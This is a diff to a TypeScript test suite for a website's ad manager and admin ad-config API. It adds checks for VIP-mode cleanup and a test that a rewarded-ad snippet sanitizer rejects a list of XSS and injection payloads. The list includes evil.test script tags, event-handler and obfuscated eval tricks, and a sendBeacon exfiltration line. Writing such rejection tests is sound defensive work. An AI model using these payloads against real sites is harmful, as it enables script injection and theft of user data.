@@ -297,13 +297,15 @@ test('4. Expired VIP clears stale token, switches to "free", and flags single ex
   assert.equal(env.storage.get('mrs_ads_expired_notice'), '1');
 });
 
-test('5. enterVipMode() purges ad DOM, clears mrs_ads_* keys, unregisters ad SWs, unsubscribes Web Push', async () => {
+test('5. enterVipMode() purges ad DOM, clears mrs_ads_* & interstitial keys, unregisters ad SWs, unsubscribes Web Push', async () => {
   const futureExp = new Date(Date.now() + 86400_000 * 30).toISOString();
   const env = createDomSandbox({
     initialStorage: {
       mrs_ads_pop_timestamps: '[12345]',
       mrs_ads_consent_v1: '{"accepted":true}',
       mrs_ad_pop_last: '12345',
+      mrs_last_interstitial_shown_at: String(Date.now()),
+      mrs_interstitial_daily_hist: '{"day":"2026-11-28","count":2}',
     },
     serviceWorkers: [
       { scriptURL: 'https://example.com/sw.js', hasPush: false },
@@ -318,6 +320,8 @@ test('5. enterVipMode() purges ad DOM, clears mrs_ads_* keys, unregisters ad SWs
   assert.equal(env.storage.has('mrs_ads_pop_timestamps'), false);
   assert.equal(env.storage.has('mrs_ads_consent_v1'), false);
   assert.equal(env.storage.has('mrs_ad_pop_last'), false);
+  assert.equal(env.storage.has('mrs_last_interstitial_shown_at'), false);
+  assert.equal(env.storage.has('mrs_interstitial_daily_hist'), false);
   assert.ok(env.removedSelectors.includes('.ad-slot'));
   assert.deepEqual(env.unregisteredUrls, ['https://example.com/monetag-push-sw.js']);
   assert.equal(env.getPushUnsubscribed(), 1);
@@ -1436,6 +1440,146 @@ test('20. ad-manager.js dynamically syncs interstitial zones & enforces intersti
   const hist = JSON.parse(storageMap.get('mrs_ads_interstitial_hist') || '{}');
   assert.equal(hist.count, 1);
 });
+
+test('21. Enhanced reward snippet sanitization rejects obfuscated/DOM/external-host payloads and enforces CSP/interstitial sync', async () => {
+  const maliciousSnippets = [
+    '<script src="https://evil.test/payload.js"></script>',
+    '<script src="http://uplcm.com/4/11226634"></script>',
+    '<script src="https://uplcm.com/4/11226634">alert(1)</script>',
+    '<script src="https://uplcm.com/4/11226634" onload="alert(1)"></script>',
+    '<img src=x onerror=alert(1)>',
+    '<math><mi><svg onload=alert(1)>',
+    '<base href="https://evil.test/">',
+    '&#x6a;avascript:alert(1)',
+    '\\u0065val("alert(1)")',
+    'window["loc"+"ation"] = "https://evil.test"',
+    'setTimeout("alert(1)", 0)',
+    'navigator.sendBeacon("https://evil.test", "secret")',
+    'new WebSocket("wss://evil.test")',
+    '(1).constructor.constructor("alert(1)")()',
+    'String.fromCharCode(97,108,101,114,116)',
+    'atob("YWxlcnQoMSk=")',
+    '<!-- sneaky --><script>alert(1)</script>',
+    '<script src="https://uplcm.com/4/11226634" data-zone="bad zone!"></script>',
+  ];
+
+  for (const payload of maliciousSnippets) {
+    assert.throws(() => sanitizeRewardedSnippet(payload), /Rewarded snippet/i, `Should reject: ${payload}`);
+    const apiRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
+      body: JSON.stringify({ monetag: { rewarded: { snippet: payload } } }),
+    });
+    assert.equal(apiRes.status, 400);
+    const apiJson = await apiRes.json() as any;
+    assert.equal(apiJson.error.code, 'invalid_snippet');
+  }
+
+  // Valid Monetag external script tag with allowlisted attributes passes cleanly
+  const safeSnippet = '<script async src="https://sub.monetag.com/tag.min.js" data-zone="11242067" data-cfasync="false"></script>';
+  assert.equal(sanitizeRewardedSnippet(safeSnippet), safeSnippet);
+
+  // Admin API accepts nested monetag.interstitial.zoneId alias & returns synchronized interstitial config
+  const aliasRes = await fetch(`${baseUrl}/api/admin/ads/config`, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
+    body: JSON.stringify({
+      monetag: { interstitial: { zoneId: '11242742' } },
+    }),
+  });
+  assert.equal(aliasRes.status, 200);
+  const cfgCheck = await fetch(`${baseUrl}/api/ads/config`);
+  const cfgCheckJson = await cfgCheck.json() as any;
+  assert.equal(cfgCheckJson.data.monetag.interstitialZoneId, '11242742');
+  assert.equal(cfgCheckJson.data.monetag.interstitial.url, 'https://uplcm.com/4/11242742');
+
+  // Restore default interstitial zone cleanly
+  await fetch(`${baseUrl}/api/admin/ads/config`, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
+    body: JSON.stringify({
+      monetag: { interstitialZoneId: '11242067', rewarded: { snippet: null } },
+    }),
+  });
+
+  // ad-manager.js must block unsafe inlineSnippet injection and remove injected interstitial nodes on VIP transition
+  const injectedScripts: any[] = [];
+  const removedIds: string[] = [];
+  const fakeElements: Record<string, any> = {
+    'mrs-monetag-interstitial': { id: 'mrs-monetag-interstitial', parentNode: { removeChild: () => removedIds.push('mrs-monetag-interstitial') } },
+  };
+  let listenerStateChange: ((e: any) => void) | null = null;
+  let currentGateState = 'free';
+
+  const mgrSb: any = {
+    console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
+    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
+    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
+    addEventListener: (ev: string, fn: any) => { if (ev === 'mrs_ads_state_change') listenerStateChange = fn; },
+    dispatchEvent: () => true,
+    MRS_AD_STATE: 'free',
+    MRS_ADS: { state: () => currentGateState, _trackLoadedScript: () => {} },
+    MRS_ADS_CONFIG: {
+      apiBaseUrl: '',
+      testMode: false,
+      monetag: {
+        verificationId: 'fa9656182dbc7301dcd9a2326441dcf3',
+        showRegularAds: true,
+        directZones: [{ id: 'uplcm-11226634', zoneId: '11226634', url: 'https://uplcm.com/4/11226634', label: 'Z1' }],
+        interstitial: {
+          zoneId: '11242067',
+          url: 'https://uplcm.com/4/11242067',
+          scriptSrc: null,
+          inlineSnippet: 'window["loc"+"ation"]="https://evil.test"',
+        },
+      },
+      caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 },
+    },
+    navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
+    location: { pathname: '/', hash: '' },
+    innerWidth: 1280,
+    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
+    sessionStorage: { getItem: () => null, setItem: () => {} },
+    document: {
+      readyState: 'complete',
+      documentElement: { getAttribute: () => null },
+      body: { appendChild: (el: any) => injectedScripts.push(el) },
+      querySelector: () => null,
+      querySelectorAll: () => [],
+      getElementById: (id: string) => fakeElements[id] || null,
+      createElement: (tag: string) => ({
+        tagName: tag.toUpperCase(),
+        attributes: {} as Record<string, string>,
+        style: {},
+        setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
+      }),
+      addEventListener: () => {},
+    },
+    fetch: async () => ({
+      ok: true,
+      status: 200,
+      json: async () => ({
+        ok: true,
+        data: {
+          formats: { banner: true, sticky: false, popunder: false, interstitial: true, push: false },
+          testMode: false,
+          monetag: { showRegularAds: true, interstitialZoneId: '11242067', caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 } },
+        },
+      }),
+    }),
+  };
+  mgrSb.window = mgrSb;
+  vm.runInNewContext(adManagerSource, mgrSb, { filename: 'ad-manager.js' });
+  await new Promise((r) => setTimeout(r, 25));
+  assert.equal(injectedScripts.length, 0);
+
+  // Transitioning to VIP triggers teardownAllAdsUi() which cleans #mrs-monetag-interstitial
+  currentGateState = 'vip';
+  mgrSb.MRS_AD_STATE = 'vip';
+  listenerStateChange?.({ detail: { state: 'vip' } });
+  assert.ok(removedIds.includes('mrs-monetag-interstitial'));
+});
+
 
 
 
